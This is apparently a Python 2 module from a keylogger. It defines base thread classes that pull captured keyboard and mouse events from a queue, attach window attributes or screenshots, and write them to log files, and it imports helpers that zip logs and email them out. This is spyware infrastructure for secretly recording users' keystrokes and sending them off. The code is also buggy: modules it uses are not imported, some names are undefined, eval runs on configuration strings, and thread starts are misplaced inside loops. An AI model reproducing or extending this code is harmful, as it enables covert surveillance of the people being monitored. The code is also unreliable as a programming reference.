from threading import Thread, Event, RLock
from myutils import (_settings, _cmdoptions, OnDemandRotatingFileHandler,
    to_unicode)
from Queue import Queue, Empty
from timerthreads import (LogRotator, LogFlusher, OldLogDeleter, LogZipper,
    EmailLogSender)
import os
import os.path

_settings = _settings['settings']
_cmdoptions = _cmdoptions['cmdoptions']

'''Event classes have two stages. The thinking is as follows.

The actual hooking routine needs to be /really/ fast, so as not to delay
user input. So it just shoves the event in a Queue and moves on. This
stage happens in the main keylogger class.

The first stage of processing the queue items needs to be /pretty/ fast,
because we need to grab various window attributes or screenshots etc.,
and this needs to happen expeditiously before windows disappear. We then
stick the processed events into another queue.

The second stage of processing can be slow. All it needs to do is
massage the info it receives, and then write it out to disk
in whatever format required.'''

class BaseEventClass(Thread):
    '''This is the base class for event-based threads.
    
    Event-based threads are ones that work off keyboard or mouse events.
    
    These classes are the main "logging" threads.
    Each one gets a Queue as an argument from which it pops off events,
    and a logger name argument which is where the logs go.
    '''
    def __init__(self, event_queue, loggername, *args, **kwargs):
        Thread.__init__(self)
        self.finished = Event()
        
        self.q = event_queue
        self.loggername = loggername
        self.args = args # arguments, if any, to pass to task_function
        self.kwargs = kwargs # keyword args, if any, to pass to task_function
        
        self.subsettings = _settings[loggername]        
    
    def cancel(self):
        '''Stop the iteration'''
        self.finished.set()
        
    def run(self):
        while not self.finished.isSet():
            self.task_function(*self.args, **self.kwargs)
                
    def task_function(self):
        pass # to be overridden in derived classes.


class FirstStageBaseEventClass(BaseEventClass):
    '''Adds system attributes to events from hook queue, and passes them on.
    
    These classes also serve as the "controller" classes. They create
    the logger, and spawn all the related timer-based threads for the logger.
    '''

    def __init__(self, *args, **kwargs):
        
        BaseEventClass.__init__(self, *args, **kwargs)
        
        self.dir_lock = RLock()
                
        self.create_loggers()
        self.spawn_timer_threads()
        self.spawn_second_stage_thread()
        
        # set the following in the derived class
        #self.task_function = self.your_working_function
    
    def create_log_directory(self, logdir):
        '''Make sure we have the directory where we want to log'''
        try:
            os.makedirs(logdir)
        except OSError, detail:
            if(detail.errno==17):  #if directory already exists, swallow the error
                pass
            else:
                logging.getLogger('').error("error creating log directory", 
                        exc_info=True)
        except:
            logging.getLogger('').error("error creating log directory", 
                        exc_info=True)

    def create_loggers(self):
        
        # configure the data logger
        logger = logging.getLogger(self.loggername)
        logdir = os.path.join(_settings['General']['Log Directory'],
                            self.subsettings['General']['Log Subdirectory'])
        
        # Regexp filter for the non-allowed characters in windows filenames.
        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")
        self.subsettings['General']['Log Filename'] = \
           self.filter.sub(r'__',self.subsettings['General']['Log Filename'])
           
        logpath = os.path.join(logdir, 
                            self.subsettings['General']['Log Filename'])
                                
        self.create_log_directory(logdir)
        
        loghandler = OnDemandRotatingFileHandler(logpath)
        loghandler.setLevel(logging.INFO)
        logformatter = logging.Formatter('%(message)s')
        loghandler.setFormatter(logformatter)
        logger.addHandler(loghandler)
    
    def spawn_timer_threads(self):
        self.timer_threads = {}
        for key in _settings[loggername].sections:
            try:
                self.timer_threads[key] = \
                    eval(_settings[loggername][key]['_Thread_Class'] + \
                    '(self.dir_lock, loggername)')
            except KeyError:
                pass # this is not a thread to be started.
    
    def spawn_second_stage_thread(self): # override in derived class
        self.sst_q = Queue(0)
        self.sst = SecondStageEventClass(self.dir_lock, self.sst_q, self.loggername)
        
    def run(self):
        for key in self.timer_threads.keys():
            self.timer_threads[key].start()
            self.sst.start()
            
    def cancel(self):
        for key in self.timer_threads.keys():
            self.timer_threads[key].cancel()
            self.sst.cancel()
        

class SecondStageBaseEventClass(BaseEventClass):
    '''Takes events from queue and writes to disk.
    
    The queue in question is the "secondary" queue passed in from
    the first stage class.
    '''
    
    def __init__(self, dir_lock, *args, **kwargs):
        
        BaseEventClass.__init__(self, *args, **kwargs)
        
        self.dir_lock = dir_lock
                
        # set the following in the derived class
        #self.task_function = self.your_working_function

